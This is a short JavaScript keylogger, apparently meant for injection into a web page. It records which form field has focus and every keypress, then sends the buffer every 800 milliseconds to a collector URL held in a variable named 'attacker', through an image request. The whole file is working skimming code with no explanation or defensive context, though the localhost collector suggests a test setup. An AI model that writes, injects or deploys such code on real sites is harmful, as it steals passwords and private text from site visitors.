var keys = '';
var attacker = 'http://localhost:8080/k?c=';

var inputs = document.querySelectorAll('input,textarea');

for (var i = 0; i < inputs.length; i++) {
    inputs[i].addEventListener('focus', function() {
        keys += '\nIn ' + document.activeElement.id + ': ';
    });
}

document.addEventListener('keypress', function(e) {
    keys += e.key;
});

window.setInterval(function() {
    if (keys.length > 0) {
        var data = encodeURIComponent(keys);
        new Image().src = attacker + data;
        keys = '';
    }
}, 800);
